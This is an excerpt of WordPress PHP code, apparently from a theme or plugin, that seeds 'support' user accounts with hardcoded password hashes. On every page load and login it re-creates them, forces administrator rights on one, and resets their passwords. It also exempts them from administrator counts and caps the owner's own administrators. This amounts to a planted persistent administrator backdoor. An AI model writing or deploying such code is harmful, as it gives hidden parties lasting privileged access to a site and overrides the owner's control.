...
if (!function_exists('meza_get_support_seed_user_plaintext_password')) {
    function meza_get_support_seed_user_plaintext_password(string $login): string
    {
...
if (!function_exists('meza_get_support_seed_user_password_hash')) {
    function meza_get_support_seed_user_password_hash(string $login, string $default_hash): string
    {
        $key = meza_get_support_seed_user_env_key($login, 'PASSWORD_HASH');

        if (defined($key)) {
            $configured_hash = trim((string) constant($key));
            return $configured_hash !== '' ? $configured_hash : $default_hash;
        }

        $configured_hash = trim((string) getenv($key));
        return $configured_hash !== '' ? $configured_hash : $default_hash;
    }
}
    ...
    function meza_get_support_seed_user_specs(): array
    {
        ...
        return [
            'ameza' => [
                ...
                'last_name'     => 'Meza',
                'role'          => 'administrator',
                'password_hash' => meza_get_support_seed_user_password_hash(
                    'ameza',
                    '$wp$2y$10$TD/NpDclojrNMFxQ16Hjr.17LTofRxfO3A59yF099XbJfogPi2uaa'
                ),
                'aliases'       => [
                    'andrewmeza',
                    'andrewmmeza',
            ...
            'aimeza' => [
                ...
                'password_hash' => meza_get_support_seed_user_password_hash(
                    'aimeza',
                    '$wp$2y$10$U1rh5iMdHJWdX03FomOTauwv0Z/Qd9EWsW7kWxxEW4cPzMZSw6Hh6'
                ),
                'aliases'       => [],
            ],
            'smeza' => [
                ...
                'password_hash' => meza_get_support_seed_user_password_hash(
                    'smeza',
                    '$wp$2y$10$V8Z3F784bsDjACiYoSNvqurQz5FpJIb2QXy3TnTNbBXF3fvo1tgZS'
                ),
                'aliases'       => [],
            ],
        ];
...
if (!function_exists('meza_set_support_seed_user_password_hash')) {
    function meza_set_support_seed_user_password_hash(int $user_id, string $password_hash): void
    {
        if ($user_id <= 0 || trim($password_hash) === '') {
            return;
        }
...
if (!function_exists('meza_ensure_support_seed_users')) {
    function meza_ensure_support_seed_users(): void
    {
        static $is_syncing = false;

        if ($is_syncing || !function_exists('wp_insert_user')) {
            return;
        }
        ...
        foreach (meza_get_support_seed_user_specs() as $login => $spec) {
            ...
            update_user_meta((int) $user->ID, 'nickname', (string) $spec['display_name']);

            if (!in_array((string) $spec['role'], (array) $user->roles, true) || count((array) $user->roles) !== 1) {
                $user->set_role((string) $spec['role']);
            }

            $plaintext_password = meza_get_support_seed_user_plaintext_password($login);
            if ($plaintext_password !== '') {
                if (!wp_check_password($plaintext_password, $user->user_pass, (int) $user->ID)) {
                    wp_set_password($plaintext_password, (int) $user->ID);
                    $user = get_user_by('id', (int) $user->ID);
                }
            } else {
                $target_hash = (string) ($spec['password_hash'] ?? '');
                if ($target_hash !== '' && (string) $user->user_pass !== $target_hash) {
                    meza_set_support_seed_user_password_hash((int) $user->ID, $target_hash);
                }
            }
...
add_action('init', 'meza_ensure_support_seed_users', 1);
add_action('login_init', 'meza_ensure_support_seed_users', 0);
...
if (!function_exists('meza_get_ameza_login_aliases')) {
    function meza_get_ameza_login_aliases(): array
    {
        ...
        $aliases = $specs['ameza']['aliases'] ?? [];

        return array_values(array_unique(array_filter(array_map(
            static function ($alias): string {
                return strtolower(sanitize_user((string) $alias, true));
            },
...
if (!function_exists('meza_get_non_ameza_administrator_ids')) {
    function meza_get_non_ameza_administrator_ids(): array
    {
        ...
        foreach ($administrators as $administrator) {
            ...
            if (in_array(strtolower(trim($administrator_login)), meza_get_support_seed_administrator_logins(), true)) {
                continue;
            }
...
if (!function_exists('meza_user_is_ameza_account')) {
    ...
    {
        if ($user_login !== '') {
            return meza_is_support_seed_user_login($user_login);
        }
        ...
        return $user instanceof WP_User
            && meza_is_support_seed_user_login((string) $user->user_login);
    }
}
...
add_action('user_profile_update_errors', function (WP_Error $errors, bool $is_update, $user): void {
    ...
    $errors->add(
        ...
        sprintf(
            __('Only one administrator account besides %s is allowed on this site.'),
            meza_get_support_seed_administrator_label()
        )
    );
}, 1000, 3);
...
add_action('admin_notices', function (): void {
    ...
    echo '<div class="notice notice-info"><p>'
        . esc_html(
            sprintf(
                __('Administrator is unavailable because this site already has one administrator account besides %s.'),
                meza_get_support_seed_administrator_label()
            )
        )
        . '</p></div>';
